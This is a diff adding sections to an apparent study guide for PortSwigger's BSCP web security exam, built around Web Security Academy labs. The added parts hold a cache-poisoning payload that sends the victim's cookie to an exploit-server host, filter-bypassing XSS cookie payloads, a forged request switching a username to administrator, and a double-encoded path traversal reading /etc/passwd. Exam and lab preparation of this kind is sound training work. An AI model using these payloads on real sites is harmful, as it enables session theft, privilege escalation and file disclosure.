@@ -19,6 +19,17 @@ The acronym BSCP has nice simular ring like OSCP  :)
 [Youtube Study Playlist](#youtube-training-playlist)  
 
 
+## Web Cache Poison  
+
+>Steal cookie by poisoning cache
+
+```javascript
+document.location='https://exploit-0a5100ba04aa6e4ec6249999015100f7.exploit-server.net//cookies?c='+document.cookie;
+```
+
+[PortSwigger Lab: Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)  
+
+
 ## Cross Site Scripting
 
 + [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
@@ -55,6 +66,12 @@ The acronym BSCP has nice simular ring like OSCP  :)
 >In the Search function on webapp a Reflected XSS is identified, then deliver exploit link to victim with cookie stealing payload in hosted **iframe** on exploit server.  
 
 >WAF is preventing dangerous search filters and tags, then bypass XSS filters using JavaScript global variables.  
+
+```JavaScript
+"-alert(window["document"]["cookie"])-"
+"-window["alert"](window["document"]["cookie"])-"
+"-self["alert"](self["document"]["cookie"])-"
+```  
 
 [Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)  
   
@@ -392,7 +409,7 @@ Connection: close
 
 >Error based or Blind SQL injection vulnerabilities, allow SQL queries in an application to be used to extract data or login credentials from the  database. SQLMAP is used to fast track the exploit and retrieve the sensitive information.  
 
->Adding a double or single quote to web parameters and evaluate the error message response, indicate possible SQL injection point.  
+>Adding a double (") or single quote (') to web parameters and evaluate the SQL error message, identify SQL injection vulnerability.  
 
 [SQL Injection cheat sheet examples](https://portswigger.net/web-security/sql-injection/cheat-sheet)  
 
@@ -572,6 +589,8 @@ sqlmap -v -u 'https://TARGET.web.net/filter?category=*' -p 'category' --batch --
 [PortSwigger Lab: SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)  
   
 ### Obfuscation
+
+>URL replacing **.** with %2e  
 
 >Double-encode the injection  
 
@@ -976,6 +995,31 @@ hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
 
 >Cross-Site Request Forgery vulnerability allows an attacker to force users to perform actions that they do not intend to perform.  
 
+>Refresh password POST request,then change username parameter to administrator while logged in as low priv user
+
+```html
+POST /refreshpassword HTTP/1.1
+Host: TARGET.web-security-academy.net
+Cookie: session=%7b%22username%22%3a%22carlos%22%2c%22isloggedin%22%3atrue%7d--MCwCFAI9forAezNBAK%2fWxko91dgAiQd1AhQMZgWruKy%2fs0DZ0XW0wkyATeU7aA%3d%3d
+Content-Length: 60
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="109", "Not_A Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Linux"
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: https://0aeb00f304106e28c6579a9f000200d6.web-security-academy.net/refreshpassword
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+csrf=TOKEN&username=administrator
+```
+
+>oAuth linking exploit server hosting iframe, then deliver to victim, forcing user to update code linked.  
+
 ![csrf](csrf.png)  
 
 >Intercepted the GET /oauth-linking?code=[...]. send to repeat to save code. Drop the request. Important to ensure that the code is not used and, remains valid. Save on exploit server an iframe in which the src attribute points to the URL you just copied.  
@@ -1055,6 +1099,24 @@ grep 'Update email'
 
 [PortSwigger Lab: Discovering vulnerabilities quickly with targeted scanning](https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning)  
   
+
+## File Path Traversal
+
+>The imagefile parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.
+
+```html
+GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```  
+
+[PortSwigger Lab: Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)  
+  
+
 ## YouTube Training Playlist 
   
 [YouTube Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
+
+
+## Footnote
+
+>The exam is designed to be challenging, it is not straight forward vulnerabilities, twisted challenges and even rabbit holes. Perseverance: persistence in doing something despite difficulty or delay in achieving success.  #TryHarder  
+  
